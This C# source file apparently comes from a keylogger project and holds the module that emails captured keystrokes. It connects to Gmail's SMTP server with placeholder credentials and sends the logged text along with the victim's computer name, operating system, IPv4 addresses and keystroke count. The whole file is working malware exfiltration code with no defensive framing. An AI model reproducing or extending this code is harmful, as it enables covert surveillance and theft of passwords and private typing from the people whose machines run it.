using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger.Keylogger
{
    public class SendKeystrokes
    {
        public static void SendToEmail(string contents)
        {
            var client = new SmtpClient("smtp.gmail.com", 587)
            {
                EnableSsl = true,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential("mail@gmail.com", "password")
            };

            var mm = new MailMessage("mail@gmail.com", "mail@gmail.com")
            {
                Subject = ComputerData.ComputerName,
                Body = $"Computer Name: {ComputerData.ComputerName}\nOperating System: {ComputerData.OperatingSystem}\nIP4v(s): {ComputerData.IPv4s}\n\n{contents}\nLogged keystrokes since startup: {Keylogger.KeystrokeCount}",
            };
            try
            {
                client.Send(mm);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}